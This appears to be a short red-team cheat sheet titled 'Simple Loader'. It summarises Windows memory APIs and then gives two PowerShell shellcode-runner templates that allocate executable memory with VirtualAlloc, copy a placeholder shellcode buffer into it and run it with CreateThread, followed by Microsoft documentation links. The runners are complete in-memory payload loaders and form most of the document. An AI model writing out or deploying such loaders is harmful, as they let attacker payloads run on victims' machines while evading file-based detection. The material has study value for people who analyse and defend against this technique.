# Simple Loader

## VirtualAlloc

Reserves, commits, or changes the state of a region of memory within the virtual address space of the calling process.

## VirtualFree

Releases, decommits, or releases and decommits a region of memory within the virtual address space of the calling process.

## VirtualProtect

Changes the protection on a region of committed pages in the virtual address space of the calling process.

```
VirtualProtect(memory_execute, memory_allocation, PAGE_EXECUTE, &ignore);
```

## VirtualProtectEx

```
VirtualProtectEx
```

## Move Memory

```
RtlMoveMemory(&destMemAddr,&source, length);
MoveMemory(&destMemAddr,&source, length);
CopyMemory(&destMemAddr,&source, length);
FillMemory(&destMemAddr,1, ByteByteOfShellcode);
```

## Powershell

```powershell
[Byte[]] $buf = <shellcode>
$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0);
```

```powershell
$Code = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$WinAPI = Add-Type -memberDefinition $Code -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $buf = <shellcode>

$addr = $WinAPI::VirtualAlloc(0,[Math]::Max($buf.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$addr,$buf.Length)

$WinAPI::CreateThread(0,0,$addr,0,0,0)
```

---
## References

- [Mr. Rc: Exploring Virtual Memory and the Virtual Memory Management API.](https://de-engineer.github.io/Understanding-Virtual-Memory-Paging-and-other-memory-related-concepts/)

- [VirtualAlloc Function](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)

- [Reserving and Committing Memory](https://learn.microsoft.com/en-us/windows/win32/memory/reserving-and-committing-memory)